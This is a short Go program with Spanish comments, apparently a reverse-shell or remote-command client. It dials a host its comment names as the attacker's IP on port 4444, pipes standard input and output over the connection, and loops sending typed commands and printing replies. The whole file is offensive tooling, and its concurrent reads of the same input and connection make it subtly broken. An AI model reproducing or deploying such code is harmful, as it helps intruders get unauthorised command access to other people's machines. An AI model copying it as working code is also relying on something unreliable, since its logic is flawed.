package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
)

func main() {
    // Dirección IP del atacante y puerto
    c, err := net.Dial("tcp", "192.168.0.14:4444")
    if err != nil {
        panic(err)
    }

    // Copiar la entrada estándar del cliente al proceso remoto
    go func() {
        _, err := io.Copy(c, os.Stdin)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Copiar la salida estándar del proceso remoto al cliente
    go func() {
        _, err := io.Copy(os.Stdout, c)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Copiar la salida de error del proceso remoto al cliente
    go func() {
        _, err := io.Copy(os.Stderr, c)
        if err != nil {
            fmt.Println(err)
        }
    }()

	reader := bufio.NewReader(os.Stdin)

    // Mantener la conexión abierta
    for {
        fmt.Println("Comando > ")
		cmd, _ := reader.ReadString('\n')

		_, err := c.Write([]byte(cmd))
		if err != nil {
			fmt.Println("Error al enviar el comando", err)
			return 
		}

		response := make([]byte, 4096)

		n, err := c.Read(response)
		if err != nil {
			fmt.Println("Error al recibir la respuesta", err)
			return
		}

		fmt.Println("Respuesta:\n", string(response[:n]))

		
    }
}